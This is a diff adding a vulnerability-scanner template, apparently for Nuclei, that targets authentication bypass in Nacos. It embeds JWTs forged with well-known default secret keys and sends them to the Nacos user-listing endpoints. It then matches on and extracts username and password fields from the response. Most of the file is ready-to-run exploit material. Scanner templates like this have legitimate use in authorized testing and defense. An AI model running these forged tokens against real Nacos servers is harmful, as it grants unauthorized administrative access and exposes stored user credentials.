@@ -1,0 +1,69 @@
+id: nacos-jwt-bypass
+
+info:
+  name: nacos-jwt-bypass
+  author: SecurityArt
+  severity: high
+  description: |
+    高版本
+    {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g","tokenTtl": 18000,"globalAdmin": true,"username":"nacos"}
+    低版本
+    Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImF1dGgiOiIiLCJleHAiOjE3MDQ0MjMzMjh9.IV97OBWpBmogVI7xf7AFLZEn28SHtOHbOmJabqXPhbM
+    
+    {"code":200,"message":"null","data":"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImF1dGgiOiIiLCJleHAiOjE3MDQ0MjMzMjh9.IV97OBWpBmogVI7xf7AFLZEn28SHtOHbOmJabqXPhbM"}
+  tags: auth-bypass,nacos,misconfig,jwt
+variables:
+  # SecretKey012345678901234567890123456789012345678901234567890123456789
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
+  # VGhpc0lzTXlDdXN0b21TZWNyZXRLZXkwMTIzNDU2Nzg=
+  token1: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0._GhyhPBLXfGVgWIAGnNT7z9mPL6-SPDAKorJ8eA1E3ZjnCPVkJYHq7OWGCm9knnDloJ7_mKDmSlHtUgNXKkkKw
+  # N2xkQXA2TkZVaGdyVU9QRllONDVJOHhVYUdtQWtjOEY=
+  token2: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.jHIPHGlyaC7qKAGj0G6Kgb1WmrIpHosCnP8cHC24zceHpbyD7cmYuLc9r1oj3J6oFGr3KMnuKJlvTy8dopwNvw
+  # qwe1rty2ui3opl4kjh5gf6dsazx7cvbnm
+  token3: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im5hY29zIiwiaWF0IjoyNjE2MjM5MDIyfQ.BEtiFKLAleuBCeakAoC6na-Lr8mfOUYUUm3nxaM0v3L5NeLk7UGZTDXCJQRguQDgU2HYE1VK9ETDIB-qjgqVnw
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"    
+      - "{{RootURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
+      - "{{RootURL}}/nacos/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token}}"  
+      - "{{RootURL}}/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token}}"
+      - "{{RootURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token1}}"    
+      - "{{RootURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token1}}"
+      - "{{RootURL}}/nacos/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token1}}"  
+      - "{{RootURL}}/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token1}}"
+      - "{{RootURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token2}}"    
+      - "{{RootURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token2}}"
+      - "{{RootURL}}/nacos/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token2}}"  
+      - "{{RootURL}}/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token2}}"
+      - "{{RootURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token3}}"    
+      - "{{RootURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token3}}"
+      - "{{RootURL}}/nacos/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token3}}"  
+      - "{{RootURL}}/v1/auth/users/?pageNo=1&pageSize=10&accessToken={{token3}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"username":'
+          - '"password":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        part: body
+        name: extracted-credentials
+        json:
+          - ".pageItems[]"
